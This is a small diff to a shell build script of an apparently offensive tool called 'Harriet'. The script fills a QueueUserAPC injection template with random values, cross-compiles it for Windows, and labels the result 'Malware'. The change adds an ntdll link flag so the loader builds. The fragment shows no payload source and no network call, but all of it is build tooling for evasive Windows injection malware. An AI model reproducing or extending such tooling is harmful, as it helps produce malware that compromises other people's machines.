@@ -90,7 +90,7 @@ sed -i "s/RandomC/$RandomC/g" Harriet/QueueUserAPC/Resources/template.cpp
 
 rm shell*
 echo -e ${yellow}"+++Compiling Malware+++"${clear}
-x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -mwindows -O2 -Os >/dev/null 2>&1
+x86_64-w64-mingw32-g++ -o $MALWARE Harriet/QueueUserAPC/Resources/template.cpp -fpermissive -Wno-narrowing Harriet/Resources/resources.res -lntdll -mwindows -O2 -Os >/dev/null 2>&1
 echo ""
 sleep 2
 echo -e ${yellow}"***Malware Compiled***"${clear}
